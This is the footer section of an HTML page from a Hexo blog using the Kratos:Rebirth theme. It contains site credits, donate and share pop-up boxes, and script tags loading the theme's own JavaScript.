                            <li>本站已在风雨中飘摇<span id="kr-since">Loading...</span></li>
                        </div>
                        <div>
                            <li>自豪地使用 <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a> 主题</li>
                            <li>站点由 <a href="https://github.com/Candinya/Kratos-Rebirth/graphs/contributors" target="_blank">lvzhouhang</a> 用 <i class="fa fa-heart" style="color:#d43f57"></i> 搭建</li>
                        </div>
                        <!-- 额外的追加注入项 -->
                        
                            <div>
                                
                                    <li>由 <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a> 强力驱动</li>
                                
                                    <li>在 <a href="https://github.io" target="_blank">Github Pages</a> 暖心托管</li>
                                
                            </div>
                        
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                <div class="box theme-box" id="theme-toggle">
                    <span class="fa fa-adjust"></span>
                </div>
            </div>
            <div id="gotop-box" class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>


    <div id="kr-donate-modal" class="kr-modal">
    <div class="kr-modal-bg" onclick="krCloseDonateModal()"></div>
    <div class="kr-modal-content">
        <div class="kr-modal-header">
            <div class="kr-modal-icon">
                <i class="fa fa-bitcoin"></i>
            </div>
            <div class="kr-modal-title">赞助喵</div>
            <button class="kr-modal-close" onclick="krCloseDonateModal()">
                <i class="fa fa-times-circle"></i>
            </button>
        </div>
        <div class="kr-modal-body">
            <div class="kr-donate-message">非常感谢您的喜欢！ <i class="fa fa-heart" style="color:#d43f57"></i></div>
            <div class="kr-donate-qr" id="kr-donate-qr">
                
                    <img class="kr-donate-placeholder" src="https://dev.krt.moe/demo-assets/donate.webp" alt="赞助喵" />
                
            </div>
            <div class="kr-donate-platforms">
                
                    
                        <button class="kr-donate-platform-button" style="color: skyblue;" title="模拟支付" onclick="krDonateModalShowPlatformQR('example_payment', 'skyblue')">
                            <i class="fa fa-credit-card"></i>
                        </button>
                    
                
            </div>
        </div>
    </div>
</div>
<script defer src="/js/kr-modal/donate.min.js"></script>




    <div id="kr-share-modal" class="kr-modal">
    <div class="kr-modal-bg" onclick="krCloseShareModal()"></div>
    <div class="kr-modal-content">
        <div class="kr-modal-header">
            <div class="kr-modal-icon">
                <i class="fa fa-share-alt"></i>
            </div>
            <div class="kr-modal-title">分享这一刻</div>
            <button class="kr-modal-close" onclick="krCloseShareModal()">
                <i class="fa fa-times-circle"></i>
            </button>
        </div>
        <div class="kr-modal-body">
            <div class="kr-share-message">让朋友们也来瞅瞅！</div>
            <div class="kr-share-qr" id="kr-share-qr"></div>
            <div class="kr-share-platforms">
                
                    <button class="kr-share-platform-button" style="color: #62b6e7;" title="喵窝" onclick="krShareModalOpenPlatform('https://nya.one/share?text=%3E%20$TITLE%0A%3E%0A%3E%20$SUMMARY%0A----%20$SITE%0A%0A$URL')">
                        <svg fill="currentColor" width="18" height="18" viewBox="0 0 329 388"><path d="M0,36.226c0,-19.993 16.233,-36.226 36.226,-36.226c13.788,0 25.787,7.719 31.908,19.068l188.366,229.845l0,-111.259c-6.356,5.508 -14.645,8.843 -23.707,8.843c-19.994,0 -36.226,-16.232 -36.226,-36.226c-0,-8.551 2.968,-16.413 7.93,-22.613l-0.015,-0.013l56.614,-69.08c6.2,-11.073 18.047,-18.565 31.63,-18.565c19.994,0 36.227,16.233 36.227,36.226l-0,314.644c-0,19.994 -16.233,36.226 -36.227,36.226c-13.166,0 -24.701,-7.039 -31.044,-17.555l-189.229,-230.899l-0,212.228c-0,19.994 -16.233,36.226 -36.227,36.226c-19.993,0 -36.226,-16.232 -36.226,-36.226l0,-314.644Z" /></svg>
                    </button>
                
            </div>
        </div>
    </div>
</div>
<script defer src="/js/kr-modal/share.min.js"></script>



<!-- 额外的追加注入项 -->


        <script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>


  <script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>



  <script defer src="/vendors/viewerjs@1.11.6/dist/viewer.min.js"></script>


<script defer src="/js/kr-core.min.js"></script>


  <script defer src="/js/kr-pjax.min.js"></script>


<!-- 额外的追加注入项 -->


    </body>
</html>